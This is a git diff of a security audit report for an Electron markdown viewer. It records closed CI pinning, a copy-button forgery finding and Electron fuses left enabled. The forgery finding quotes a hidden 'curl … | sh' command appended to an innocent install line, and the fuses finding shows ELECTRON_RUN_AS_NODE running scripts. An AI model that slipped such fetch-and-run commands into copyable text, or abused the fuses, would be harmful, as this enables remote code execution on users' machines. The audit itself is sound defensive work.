@@ -1,33 +1,39 @@
 # Security Audit Report
 
-Date: 2026-10-12 (plan 28 step 6, pre-release audit for v1.4.0)
-Score: 91/100
+Date: 2026-10-13 (full audit, after plan 31's English UI)
+Score: 92/100
 Project: Electron (main + preload + renderer), Node.js, GitHub Actions, Homebrew cask distribution
-Previous: 96/100 (2026-09-17, re-audit) · 87/100 (2026-09-17) · 94/100 (2026-08-10) · 96/100 (2026-08-06)
-Baseline commit: `907e9e6` (last full audit) → `77c681c` (develop today)
+Previous: 91/100 (2026-10-12) · 96/100 (2026-09-17, re-audit) · 87/100 (2026-09-17) · 94/100 (2026-08-10) · 96/100 (2026-08-06)
+Baseline commit: `77c681c` (last full audit) → `8d0093b` (develop today)
 
-> The 2026-09-17 report is in git history (`git show 907e9e6:security-report.md`). Nothing in
-> this one is carried over from it, or from `memory-security.md`, without being re-checked:
-> every row in *What's Secure* below comes from a command run today.
+> The 2026-10-12 report is in git history (`git show 5dbc9f7:security-report.md`). Nothing here
+> is carried over from it, or from `memory-security.md`, without being re-checked: every row in
+> *What's Secure* comes from a command run today.
 
 ---
 
 ## Scope
 
 MDV is an offline-first desktop markdown viewer with no server, no database, no accounts and no
-sessions. Its real attack surface is unchanged: **it renders untrusted `.md` files and resolves
-the file paths they name.** What changed since the last audit:
+sessions. Its attack surface is still this: **it renders untrusted `.md` files and resolves the
+file paths they name.** Changes since `77c681c`:
 
-| Area | Change since `907e9e6` |
+| Area | Change since `77c681c` |
 |---|---|
-| Runtime | Electron 42 → **44.7.0**; js-yaml 4 → 5, KaTeX 0.16 → 0.18.9, hljs 11.12, mermaid 11.17 |
-| Main process | Dialog start-folder memory (`save-file-dialog`/`export-pdf` take a second `docPath` arg); watcher `error` listeners; poll backend for configured roots (`watch-options.js`) |
-| Renderer | Frontmatter card with render budget (2026-10-02 finding, fixed); print vertical table; ⌘U reading position; theme value validation |
-| CI | New `ci-electron.yml`, new **`claude-review.yml`** (AI review bot holding `CLAUDE_CODE_OAUTH_TOKEN`) |
-| Supply chain | `min-release-age` **7 → 3** (deliberate, 2026-10-12, PR #42) |
+| Main process | PR #51: `productName` `MDV`, userData pinned to `appData/mdv`. PR #52: string table `require`d from `renderer/i18n.js`; menu, `role` labels, close dialog and IPC error text go through `t()`; `additionalArguments: --mdv-locale=` |
+| Preload | One new member, `api.locale`, parsed from its own argv and allow-listed (`en`, otherwise `ko`). No new channel |
+| Renderer | Every UI string moved to `i18n.js` (150 keys); static markup translated by `applyStaticTranslations`; copy-button tooltip moved from CSS `content:` to `data-tooltip` |
+| CI | PR #45 pinned every action to a commit SHA (2026-10-12 M1). PR #46 moved the review bot to the Claude GitHub App (`id-token: write`) |
+| Release | v1.4.0 shipped 2026-10-12 through the pinned release workflow; the cask moved to `postflight_steps` (plan 29) |
+| Dependencies | None. `package-lock.json` changed only its own version field; `package.json` gained `productName` and `electronLanguages` |
 
-Category 22 (AI/LLM) now applies for the first time, because of the review bot. Eight categories
-remain N/A (Auth, JWT, Database, Docker, Protocols, DNS/Email, Mobile, Serverless).
+Category 22 (AI/LLM) applies because of the review bot. Eight categories remain N/A: Auth, JWT,
+Database, Docker, Protocols, DNS/Email, Mobile, Serverless.
+
+The skill's two "AI blind spot" checks were looked at on purpose, not skipped. **Rate limiting:**
+there is no public endpoint. The only network call is the outbound update check, already bounded
+(10 s timeout, 1 MB body cap, once per 24 h). **Session fixation:** there are no sessions, logins
+or privilege levels. `session.json` stores open tabs, not credentials.
 
 ---
 
@@ -41,116 +47,178 @@ None.
 
 ## Medium Issues
 
-### M1 — third-party GitHub Actions are pinned to movable tags in jobs that hold write tokens
-
-| Workflow | Action | What the job holds |
-|---|---|---|
-| `release.yml:34` | `softprops/action-gh-release@v3` | `contents: write` token; the built `dist/MDV-*.zip` and `dist/SHA256SUMS` on disk; **the next step receives `HOMEBREW_TAP_TOKEN`** |
-| `claude-review.yml:45` | `anthropics/claude-code-action@v1` | `CLAUDE_CODE_OAUTH_TOKEN`; `pull-requests: write`, `issues: write` |
-
-**Why it matters.** A tag such as `@v3` is a pointer that the action's owner, or anyone who takes
-over their account, can move to new code at any time. Every later run then executes that code
-without any change in this repo. This exact attack happened in March 2025, when the
-`tj-actions/changed-files` tags were repointed to a commit that dumped CI secrets.
-
-The release job is the serious case. It runs the action in the same job and on the same runner
-*before* the Homebrew step. A malicious version would not need to steal anything. It could
-rewrite `dist/MDV-*.zip` and `dist/SHA256SUMS` together, and the next step would publish the
-matching hash to the tap that `brew upgrade` installs from. It could also edit
-`scripts/update-homebrew-tap.sh` on disk before that step reads it, which would expose
-`HOMEBREW_TAP_TOKEN`. The cask's `sha256` is the only download-integrity control the app has
-(it is unsigned), and in this scenario it would vouch for the tampered file.
-
-The review bot's exposure is narrower. The OAuth token grants inference only, the job runs only
-for same-repo PRs, and its GitHub token cannot push.
-
-**Status: fixed in PR `ci/pin-actions-to-sha` (Ian approved 2026-10-12).** Every `uses:` in all four workflows is now a
-commit SHA with its version as a comment: `softprops/action-gh-release` v3.0.3 (the commit `v3` pointed to that day),
-`anthropics/claude-code-action` v1.0.247 (newest past the 3-day cooldown; `v1` was already at v1.0.248), `actions/checkout`
-v7.0.1, `actions/setup-node` v7.1.0. `release.yml` only runs on a tag, so its pin is first exercised by the v1.4.0 release.
-
-**Fix as originally proposed.** Pin both to a full commit SHA and keep the tag
-as a comment, e.g. `softprops/action-gh-release@<40-hex-sha> # v3.x.y`. Resolve the SHA from the
-tag on the day it is pinned, and record which version that is. GitHub's own `actions/checkout`
-and `actions/setup-node` carry much less risk and can stay on tags, or be pinned in the same
-change for consistency. Pinning does not affect plan 28 step 7a: the OIDC check compares the
-workflow file with its copy on the default branch, not the action ref.
+None. The 2026-10-12 medium (M1, actions pinned to movable tags) is **closed**. All four
+workflows use commit SHAs. The tag `v1.4.0` itself carries
+`softprops/action-gh-release@efb35369… # v3.0.3`, so the release that shipped ran the pinned
+action.
 
 ## Low Issues
 
-None.
+### L1 — a document can forge MDV's code-copy button and copy text the reader cannot see
+
+**What happens.** Raw HTML in a `.md` file can rebuild the exact markup MDV uses for a code block:
+a `.code-wrapper` with a `<button class="copy-btn" data-command="copyCode"
+data-command-element="true">`. Everything involved survives sanitization. `#content`'s click
+handler (`app-shell.js:359-366`) runs **any** `data-command` it finds there, and `copyCode`
+(`app-runtime.js:416-419`) copies the nearest `<code>`'s `innerText`. `innerText` includes text
+that is rendered but invisible. So the reader sees `npm install left-pad`, presses the familiar
+copy button, and gets `npm install left-pad; curl -s https://… | sh`.
+
+**Measured today.**
+- DOMPurify keeps the forged wrapper, the button with both `data-command*` attributes, and
+  `style="font-size:0"` on a span. This was run in jsdom through the real `markdown.js` render
+  path with the real DOMPurify.
+- Electron 44.7.0's `innerText` includes the hidden span's text for `font-size:0` (span width
+  0 px), `opacity:0`, `color:transparent` and an offscreen span. The control, `display:none`, is
+  excluded, so the probe tells the cases apart. This ran in a `show: false` window.
+- Read from code, not run: the dispatch path and `copyCode`. A click in the running app was not
+  run, because the full app opens windows.
+
+**Why only Low.**
+- Selecting the text and pressing ⌘C already copies the hidden part. The forged button only adds
+  a one-click copy that looks like MDV's own.
+- Shells with bracketed paste (macOS's default zsh, 5.1+; bash 5.1+) show the whole pasted line
+  before it runs.
+
+It has been in the code since 2026-06 (`bindContentCommandHandler` in `ca2a2f9`, `copyCode`'s
+`innerText` in `04c698e`) and is in every release. **Newly found, not a regression.**
+
+The same handler lets document HTML trigger any other renderer command on click, such as
+`closeCurrentTab`, `saveFile`, `openFolder` or `exportPdf`. None of them does more than the
+toolbar button of the same name, and the ones that matter still ask (dialogs, the unsaved-changes
+prompt). `commands[name]` is an object-literal lookup, so `data-command="constructor"` reaches
+`Object`. That was checked: it is harmless (`Object(x)` or a caught `TypeError`). The fix below
+closes it anyway.
+
+**Fix (proposed, not applied).** A CSS fix cannot work: MDV's own `.visually-hidden` class
+survives DOMPurify, so text can be hidden without any inline style. The fix belongs on the
+command side:
+1. Content clicks honor only `copyCode`; every other `data-command` inside `#content` is ignored.
+   This also closes the prototype-key lookup.
+2. Genuine copy buttons carry a per-render random marker that the document cannot predict.
+   `renderer.code` emits it and the click handler checks it. A forged button has no valid marker.
+3. `copyCode` copies the fence source captured at render time, not `innerText`. A fence's own
+   text cannot carry styles, so what is copied is what the reader saw.
+
+It changes copy-button behaviour, so it needs Ian's approval (Level 4). A unit test should forge
+the button and assert that nothing is copied; an Electron test should assert that a genuine block
+still copies.
+
+### L2 — the packaged app keeps Electron's default fuses, so it can be run as plain Node
+
+`npx @electron/fuses read --app /Applications/MDV.app` (v1.4.0) and the local
+`dist/mac-arm64/MDV.app` both show:
+
+| Fuse | State |
+|---|---|
+| `RunAsNode` | **Enabled** |
+| `EnableNodeOptionsEnvironmentVariable` | **Enabled** |
+| `EnableNodeCliInspectArguments` | **Enabled** |
+| `EnableEmbeddedAsarIntegrityValidation` | Disabled |
+| `OnlyLoadAppFromAsar` | Disabled |
+| `GrantFileProtocolExtraPrivileges` | Enabled |
+| `EnableCookieEncryption`, `LoadBrowserProcessSpecificV8Snapshot` | Disabled |
+| a ninth fuse the installed `@electron/fuses` cannot name | Enabled |
+
+**Measured.** `ELECTRON_RUN_AS_NODE=1 /Applications/MDV.app/Contents/MacOS/MDV -e '…'` printed
+`{"electron":"44.7.0","node":"24.21.0","typeofRequire":"function"}`. The shipped binary runs any
+script as plain Node, with no window and no prompt.
+
+**Why it matters, and why only Low.** This gives nothing to someone without code execution. Code
+that already runs as the user can borrow MDV's identity, though. On macOS, file-access permissions
+(Documents, Desktop, Downloads, network volumes, Full Disk Access) are granted per app. A process
+started as MDV gets **whatever grants MDV holds, if the user granted any**. This audit did not
+check which grants MDV holds. `NODE_OPTIONS=--require …` and `--inspect` are the same door. This
+is a known pattern for Electron apps, and Electron's own security checklist asks apps to switch
+off fuses they don't use. No earlier audit looked at fuses.
+
+**Fix (proposed, not applied).** In `package.json` `build`, add `electronFuses` with `runAsNode`,
+`enableNodeOptionsEnvironmentVariable` and `enableNodeCliInspectArguments` set to `false`.
+Electron-builder 26 supports this. Leave the rest alone:
+- `grantFileProtocolExtraPrivileges` stays on: the UI loads over `file://`, so turning it off needs
+  its own test pass.
+- Asar integrity adds little while only an ad-hoc signature protects `Info.plist`.
+
+Two things to verify when applying it:
+- Flipping fuses rewrites the binary, and arm64 kills a binary whose signature no longer matches.
+  The ad-hoc signature must be redone (electron-builder's `resetAdHocDarwinSignature`), and a
+  clean `brew install` of the result must launch.
+- Playwright `_electron.launch({ executablePath })` against a packaged build needs the inspect
+  arguments. Checks like plan 31 §8's packaged-build probes would stop working. The test suite
+  itself runs the unpackaged Electron from `node_modules` and is unaffected.
+
+Needs Ian's approval (Level 4).
 
 ---
 
 ## Info / Accepted
 
-### The cooldown is 3 days now, and Electron 44.7.0 entered under it
-
-Deliberate change, recorded in `memory-security.md` (2026-10-12) with its reasoning. To grade
-today's own work by the standard the 2026-09-17 audit applied to the font: Electron 44.7.0 was
-published 2026-10-07 19:26 UTC. It would not have cleared the old 7-day window until 2026-10-15,
-so the shipped runtime is in the tree only because of this change. The window it did clear was
-3 days. Its lockfile entry resolves to `registry.npmjs.org/electron/-/electron-44.7.0.tgz` with
-an `integrity` hash. The packaged app was built and driven end to end (PR #44). Nothing found;
-recorded because the trade-off is real.
-
 ### Remaining `npm audit` output: 10 nodes, 2 advisories, neither reachable
 
-`npm audit` reports `low: 2, moderate: 8`. That count is per package node. Per advisory there
-are two:
+The output is unchanged from 2026-10-12: `low: 2, moderate: 8`, `high: 0`, `critical: 0`.
+`--omit=dev` reports only the 2 lows.
+- **sprintf-js GHSA-hp3w-g68c-fv3c**: build-only, at the end of
+  `electron-builder › … › global-agent › roarr`. npm's only fix is `--force` to an older
+  electron-builder.
+- **KaTeX GHSA-238p-pmpm-9mq7 (low)**: the 0.16.47 copy bundled inside `mermaid.min.js`. Mermaid
+  never sets `trust`. MDV's own KaTeX is 0.18.9.
 
-- **sprintf-js — GHSA-hp3w-g68c-fv3c (medium, DoS via unbounded precision specifiers).** It
-  sits at the end of `electron-builder › app-builder-lib › @electron/get › global-agent › roarr`,
-  and every one of the 8 moderate nodes is a link in that chain. It is **build-only**, and
-  nothing attacker-controlled reaches a format string there. npm's only fix is `--force` to
-  electron-builder 26.5.0, a downgrade. Not taken.
-- **KaTeX ≥0.11 <0.18.2 — GHSA-238p-pmpm-9mq7 (low).** The title is *"Existing prototype
-  pollution can bypass trust restrictions"*. MDV's own KaTeX is 0.18.9 and not affected. The
-  vulnerable 0.16.47 is the copy bundled inside `mermaid.min.js`. Verified in that bundle:
-  mermaid calls `renderToString(…, {throwOnError, displayMode, output})` and **never sets
-  `trust`**, so there is no trust restriction to bypass. The advisory also requires prototype
-  pollution that already exists. `memory-security.md` had listed this one as *moderate*, which is
-  corrected there. Revisit with mermaid 12.
+Electron 44.7.0 is the newest 44.x on npm (44.6.0 2026-10-06, 44.7.0 2026-10-07).
 
-The CI gate blocks high and critical only. It passes.
+### `MDV_*` environment variables are read by the shipped app
+
+`MDV_USER_DATA_DIR`, `MDV_LOCALE`, `MDV_REPO_OWNER`/`MDV_REPO_NAME` (the update-check repository)
+and three `MDV_TEST_*` switches are read in `main.js`. Setting them requires control of the user's
+launch environment, which already means code execution as the user. Each value is either
+allow-listed (`MDV_LOCALE` → `ko`/`en`) or only redirects MDV's own files or its notify-only update
+check. L2 is the stronger version of the same precondition. Recorded so a later audit doesn't
+rediscover them.
 
 ### The AI review bot reads attacker-influenced text
 
-PR diffs are input to a model that can post comments. This is contained in four ways: the job's
-`if` admits only PRs whose head repo is this repo, so fork PRs never run it; `allowedTools` is
-`Read`/`Grep`/`Glob`, three `gh pr` subcommands and inline comments; the `GITHUB_TOKEN` cannot
-push (`contents: read`); and the prompt interpolates only `github.repository` and the PR number,
-never the title, body or branch name. A prompt injection would at worst get a misleading comment
-posted. M1 is the realistic path to the token.
+Unchanged containment, re-read today:
+- The job's `if` admits only same-repo, non-draft PRs.
+- `allowedTools` is `Read`/`Grep`/`Glob`, three `gh pr` subcommands and inline comments.
+- `contents: read`.
+- The prompt interpolates only `github.repository` and the PR number.
+
+New since 2026-10-12: `id-token: write`, which the action trades for a Claude GitHub App token
+scoped to this repo. It posts as `claude[bot]`.
 
 ### Carried from 2026-09-17, unchanged
 
-- `'unsafe-inline'` in `style-src` (style only; `script-src` is a bare `'self'`).
-- Unsigned and un-notarized app; download integrity rests on the cask `sha256` (see M1).
-- Bundled font binaries rest on one HTTPS fetch from fonts.gstatic.com.
-- npm 11 warns that `electron-winstaller`'s install script is not covered by `allowScripts`.
-  It is a Windows-target dependency of electron-builder, and the only build here is macOS.
+- `'unsafe-inline'` in `style-src`. This is style only; `script-src` is a bare `'self'`.
+  Dropping it would **not** fix L1 (see above).
+- The app is unsigned and un-notarized. Download integrity rests on the cask `sha256`. Today the
+  chain matches: GitHub's asset digest, `SHA256SUMS` and the cask are all `00889bfc…b223`.
+- The bundled font binaries rest on one HTTPS fetch from fonts.gstatic.com.
+- npm warns that `electron-winstaller`'s install script is not covered by `allowScripts`. It is
+  Windows-only, and the only build here is macOS.
 
 ---
 
 ## What's Secure
 
-Every row was checked today against `77c681c`.
+Every row was checked today against `8d0093b` (develop) or the shipped v1.4.0.
 
 | Area | Evidence (command or file read today) |
 |---|---|
-| **Electron isolation** | `main.js:212-214`: `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` |
-| **Renderer containment** | `setWindowOpenHandler` (`:224`) hands only `^https?://` to the OS browser; `will-navigate` (`:233`) blocks leaving the shell; `open-external-url` (`:535`) applies the same scheme check |
+| **Electron isolation** | `main.js:228-230`: `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` |
+| **Renderer containment** | `setWindowOpenHandler` (`:242`) hands only `^https?://` to the OS browser and always denies; `will-navigate` (`:251`) blocks leaving the shell; `open-external-url` (`:555`) applies the same scheme check |
 | **CSP** | `index.html:7`: `default-src`/`script-src`/`font-src` bare `'self'`, `img-src 'self' data:`, `form-action`/`base-uri`/`object-src 'none'`; **0** `https?://` references in `index.html` |
-| **New IPC arguments** | `docPath` is used only as a native dialog's `defaultPath` and accepted only if `path.isAbsolute`; the suggested name goes through `path.basename` and `.`/`..` are rejected. The user still picks the real path, and `preload.js` gained no new channel |
-| **Watcher robustness** | Both chokidar watchers now have an `error` listener. Before, an unhandled `error` event on the main process could throw. Errors drop just that watch and the app keeps running |
-| **XSS** | New frontmatter HTML: every key/value goes through `escapeHtml`, and the card goes through `sanitizeHtml` (DOMPurify) before insertion; the renderer diff adds no `innerHTML`/`eval`/`new Function` |
-| **Injection** | No `eval`, `new Function` or `child_process` in `src/`; `shell.openPath` only on realpath-checked targets (`:621`) |
-| **Renderer DoS** | Frontmatter render budget (nodes 5000, text 100k, depth 100, cycle cut), from the 2026-10-02 fix |
-| **Dependencies** | `npm audit`: **0 critical, 0 high**; 2 advisories remain, both explained above. Electron 44.7.0 from the npm registry with integrity. Electron 42 EOL (2026-10-20) is no longer relevant |
-| **Cooldown** | `.npmrc` `min-release-age=3`, and `npm config get` returns `3` in the repo |
-| **Secrets** | `git log 907e9e6..HEAD -p` has no secret-shaped additions and no `.env`/`.pem`/`.key` files. The two Actions secrets are referenced only via `secrets.*` |
-| **CI tokens** | `ci.yml`/`ci-electron.yml` `contents: read`; `release.yml` `contents: write`; `claude-review.yml` scoped per job; no `pull_request_target` or `workflow_run` anywhere |
+| **IPC surface** | 21 `ipcMain` handlers, the same set as before; preload exposes the matching channels plus `api.locale` (allow-listed). The locale is chosen in main by `resolveLocale` (`/^ko(?:$|[-_])/i`), so neither `MDV_LOCALE` nor the OS locale passes a raw value |
+| **Translation sinks** | Every `t()` call that takes an argument (14 sites: file names, error text, counts, version) lands in `textContent`, `alert`/`confirm`, or a native menu or dialog label. The `innerHTML` sinks went from 38 to 38 in the renderer modules (3 replaced one for one), plus `applyStaticTranslations`'s `data-i18n-html`; all of them take fixed table strings with no arguments. Translated values in attributes go through `escapeHtml` (`markdown.js` copy button and frontmatter, `app-runtime.js` empty state). Key lookup uses `Object.hasOwn` (unit-tested against `__proto__`/`constructor`) |
+| **XSS** | Rendered markdown still goes through `sanitizeHtml` (DOMPurify) before insertion (`markdown.js:401-428`), and so does the frontmatter card (`:828`); plan 31 did not touch the sanitize path |
+| **Injection** | No `eval`, `new Function` or `child_process` in `src/`; the two `RegExp(...).exec` calls are a fixed alert pattern and one built from marked's numeric heading depth |
+| **Local paths** | `open-local-path` checks the extension of both the link name and its `realpath` (`:589-590`, `:619-624`) before `shell.openPath(realPath)` (`:641`); `read-image-data-url` reads through the resolved path after the same two-sided check |
+| **Renderer DoS** | Frontmatter render budget unit tests pass (part of today's 285/285); watcher `error` listeners at `main.js:904` and `:965` |
+| **Trojan Source** | No bidi controls, zero-width characters or soft hyphens in 111 tracked code and config files. The scanner was run once against a planted U+202E to confirm it reports one |
+| **Dependencies** | `npm audit`: 0 critical, 0 high; 446 lockfile entries, all from `registry.npmjs.org`, none missing `integrity`; no dependency changed since the last audit |
+| **Cooldown** | `.npmrc` `min-release-age=3`; `npm config get` returns `3` |
+| **Secrets** | `git log 77c681c..HEAD -p` adds nothing secret-shaped; no `.env`/`.pem`/`.key`/`.p12` in the tree; the three Actions secrets are referenced only through `secrets.*` |
+| **CI tokens and pinning** | Every `uses:` is a commit SHA; `ci.yml`/`ci-electron.yml` `contents: read`, `release.yml` `contents: write`, review job scoped per job; no `pull_request_target` or `workflow_run`; no `${{ }}` inside any `run:` block (parsed with js-yaml) |
+| **Release chain** | v1.4.0's release run succeeded on the pinned action; the asset digest, `SHA256SUMS` and the tap's cask `sha256` agree; the cask's `postflight_steps` runs only `/usr/bin/xattr -dr com.apple.quarantine {{appdir}}/MDV.app` |
+| **Tests** | `npm run test:unit` 285/285, `npm run test:controller` 13/13 today |
 
 ---
 
@@ -158,13 +226,13 @@ Every row was checked today against `77c681c`.
 
 ```
 ╔════════════════════════════════════════════════════════╗
-║          SECURITY SCORE : 91/100  🟢                    ║
+║          SECURITY SCORE : 92/100  🟢                    ║
 ╠════════════════════════════════════════════════════════╣
 ║  🟢 Secrets & Files            100/100   (8%)   =      ║
 ║  🟢 Network & Egress           100/100   (5%)   =      ║
 ║  🟢 HTTP Headers / CSP          90/100   (5%)   =      ║
 ║  🟢 Cryptography / Signing      90/100   (6%)   =      ║
-║  🟡 Deployment & CI             80/100   (5%)  -20     ║
+║  🟢 Deployment & CI            100/100   (5%)  +20     ║
 ║  🟢 Advanced Attacks           100/100   (7%)   =      ║
 ║  🟢 Injections                 100/100   (6%)   =      ║
 ║  🟢 Race Conditions             95/100   (4%)   =      ║
@@ -172,38 +240,43 @@ Every row was checked today against `77c681c`.
 ║  🟢 Supply Chain                95/100   (5%)   =      ║
 ║  🟢 Compliance / Privacy       100/100   (4%)   =      ║
 ║  🟡 Monitoring                  80/100   (3%)   =      ║
-║  🟢 Source Code Analysis       100/100   (7%)   =      ║
+║  🟢 Source Code Analysis        95/100   (7%)   -5     ║
 ║  🟢 Resource Limits            100/100   (3%)   =      ║
-║  🟢 AI/LLM (CI review bot)     100/100   (3%)  new     ║
+║  🟢 AI/LLM (CI review bot)     100/100   (3%)   =      ║
 ║  🟢 Browser APIs               100/100   (2%)   =      ║
-║  🟠 Advanced Security (L3)      60/100   (2%)   =      ║
+║  🟠 Advanced Security (L3)      55/100   (2%)   -5     ║
 ╠════════════════════════════════════════════════════════╣
 ║  N/A: Auth · JWT · Database · Docker · Protocols ·     ║
 ║       DNS/Email · Mobile · Serverless                  ║
 ╚════════════════════════════════════════════════════════╝
-  📈 96/100 (2026-09-17, 25 days ago) → 91/100
-  🔴 0 critical · 🟠 0 high · 🟡 1 medium · 🔵 0 low
+  📈 91/100 (2026-10-12, 1 day ago) → 92/100
+  🔴 0 critical · 🟠 0 high · 🟡 0 medium · 🔵 2 low
 ```
 
-**Arithmetic.** The 2026-09-17 method starts from 96, where the 4 missing points are structural
-(L3 signing, Monitoring, `'unsafe-inline'`, font provenance), and subtracts each finding's
-penalty. M1 is one medium, −5 → **91**. Info items cost nothing. The two npm advisories are
-counted per advisory, not per node, and neither is reachable.
+**Arithmetic.** The method starts from 96. The 4 missing points are structural: L3 signing,
+Monitoring, `'unsafe-inline'` and font provenance. Each finding's penalty is then subtracted.
+- M1 is closed, so its −5 is gone.
+- L1 and L2 are Low, −2 each.
+- 96 − 2 − 2 = **92**.
 
-**Why M1 is new rather than a regression:** `softprops/action-gh-release@v3` has been in
-`release.yml` since 2026-07-30, and no earlier audit looked at action pinning. The review bot
-added the second instance on 2026-10-07.
+Info items cost nothing.
+
+L1 counts under Source Code Analysis as UI misrepresentation (CWE-451). L2 counts under Advanced
+Security (L3), as anti-tamper and runtime hardening.
 
 ---
 
 ## Next Steps
 
-1. **Before releasing v1.4.0: pin `softprops/action-gh-release` to a commit SHA** (M1). The
-   release is the run where it matters, and the change is one line. Doing
-   `anthropics/claude-code-action` in the same PR is natural, since plan 28 step 7a already
-   edits `claude-review.yml` right before the release.
-2. Afterwards, as before: code signing and notarization if distribution widens; Trusted Types
-   together with dropping `'unsafe-inline'`; rebuild the font subsets from the JetBrains upstream
-   release.
-3. Revisit the nested KaTeX with mermaid 12, and the sprintf-js chain when electron-builder
-   moves off `global-agent`.
+1. **L1 (copy-button forgery):** allow-list `copyCode` for content clicks, mark genuine buttons
+   with a per-render random marker, and copy the fence source instead of `innerText`. Add a forged
+   button unit test and a genuine-copy Electron test. Needs approval: it changes copy behaviour.
+2. **L2 (fuses):** add `build.electronFuses` turning off `runAsNode`,
+   `enableNodeOptionsEnvironmentVariable` and `enableNodeCliInspectArguments`. Verify the re-signed
+   binary launches from a clean `brew install`. Accept that packaged-build Playwright probes stop
+   working. Best landed before the next release, since only a release puts it in users' hands.
+3. Afterwards, as before:
+   - code signing and notarization, if distribution widens;
+   - Trusted Types, together with dropping `'unsafe-inline'`;
+   - rebuilding the font subsets from the JetBrains upstream release;
+   - revisiting the nested KaTeX with mermaid 12.
